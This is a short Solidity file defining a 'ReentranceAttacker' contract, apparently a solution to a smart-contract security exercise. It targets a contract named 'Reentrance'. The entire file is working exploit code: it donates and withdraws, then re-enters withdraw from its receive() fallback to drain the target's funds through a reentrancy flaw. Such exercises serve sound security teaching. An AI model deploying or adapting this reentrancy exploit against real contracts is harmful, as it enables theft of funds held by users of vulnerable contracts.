// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import {Reentrance} from "./Reentrance.sol";

contract ReentranceAttacker {
    Reentrance s_target;

    constructor(address payable reentranceAddress) payable public {
        s_target = Reentrance(reentranceAddress);
    }

    function attack() public payable {
        s_target.donate{value: msg.value}(address(this));
        s_target.withdraw(msg.value);
    }

    receive() external payable {
        s_target.withdraw(msg.value);
    }
}
